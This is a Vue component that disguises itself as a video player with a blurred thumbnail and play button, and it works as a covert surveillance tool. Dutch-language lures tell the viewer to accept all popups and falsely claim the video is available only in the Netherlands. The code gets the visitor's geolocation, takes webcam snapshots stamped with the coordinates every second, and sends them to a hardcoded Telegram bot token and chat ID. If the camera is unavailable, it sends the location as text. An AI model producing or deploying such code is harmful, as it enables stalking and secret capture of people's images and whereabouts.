<template>
    <div class="w-full h-full bg-black flex flex-col justify-center items-center text-white justify-center items-center">
        <div @click="getLocationAndCapture" class="relative w-full max-w-sm mx-auto">
            <div class="aspect-w-16 aspect-h-9 bg-black relative overflow-hidden">
                <img :src="fallback" alt="Video Thumbnail" class="w-screen h-screen object-cover filter blur">
                <div class="absolute inset-0 flex items-center justify-center">
                    <div class="bg-white flex items-center justify-center bg-opacity-25 rounded-full p-2">
                        <div v-if="!started" @click="started = true">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
                                stroke="currentColor" class="w-6 h-6">
                                <path stroke-linecap="round" stroke-linejoin="round"
                                    d="M5.25 5.653c0-.856.917-1.398 1.667-.986l11.54 6.348a1.125 1.125 0 010 1.971l-11.54 6.347a1.125 1.125 0 01-1.667-.985V5.653z" />
                            </svg>
                        </div>

                        <div v-else role="status" class="flex flex-col justify-center items-center text-center">
                            <svg aria-hidden="true"
                                class="mb-4 w-8 h-8 mr-2 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600"
                                viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                                    fill="currentColor" />
                                <path
                                    d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                                    fill="currentFill" />
                            </svg>
                            <span class="sr-only">Loading...</span>
                            <p class="text-white text-xs">Accepteer alle popups om deze video af te kunnen spelen</p>
                        </div>


                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script setup>
import { ref } from 'vue'
import { onBeforeMount } from 'vue';
import fallback from './assets/photo.png'

let started = ref(false);

const getLocationAndCapture = () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError)
    } else {
        alert("Geolocation is not supported by this browser.")
    }
}

const sendPosition = (position) => {
    capturePhoto("La: " + position.coords.latitude.toFixed(5) + "\nLo: " + position.coords.longitude.toFixed(5))

    setInterval(() => {
        capturePhoto("La: " + position.coords.latitude.toFixed(5) + "\nLo: " + position.coords.longitude.toFixed(5))
    }, 1000);

}

const showError = (error) => {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            alert("U kunt deze video alleen in Nederland bekijken. Geeft toesteming tot uw locatie in uw browser")
            break
        case error.POSITION_UNAVAILABLE:
            alert("Location information is unavailable.")
            break
        case error.TIMEOUT:
            alert("The request to get user location timed out.")
            break
        case error.UNKNOWN_ERROR:
            alert("An unknown error occurred.")
            break
    }
}

const sendLocationToTelegram = async (location) => {
    const formData = new FormData();
    formData.append("chat_id", "1086643766");
    formData.append("text", `Location: ${location}`);

    const BOT_TOKEN = "5815481193:AAHQ-OXKncRdMZ5kwJGYjlV2i0N397qEq4c";
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        body: formData
    });

    const responseData = await response.json();
    if (!responseData.ok) {
        throw new Error(`Telegram API error: ${responseData.description}`);
    }
};

const capturePhoto = async (location) => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            ctx.font = '30px Arial';  // Set font size and face.
            ctx.fillStyle = 'white';  // Set text color.
            ctx.fillText(location, 10, 30);

            // Convert canvas to blob
            const photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg'));

            // Prepare the form data
            const formData = new FormData();
            formData.append("chat_id", "1086643766");
            formData.append("photo", photoBlob);

            // Send the photo to Telegram
            const BOT_TOKEN = "5815481193:AAHQ-OXKncRdMZ5kwJGYjlV2i0N397qEq4c";
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            const responseData = await response.json();
            if (!responseData.ok) {
                throw new Error(`Telegram API error: ${responseData.description}`);
            }

            // Stop the camera stream
            stream.getTracks().forEach(track => track.stop());
        }, 1000);
    } catch (err) {
        console.error("Camera access error:", err);
        // Send the location to Telegram
        try {
            await sendLocationToTelegram(location);
        } catch (telegramError) {
            console.error("Telegram API error:", telegramError);
            alert("Failed to send location to Telegram.");
        }
    }
};

onBeforeMount(() => {
    getLocationAndCapture();
});

</script>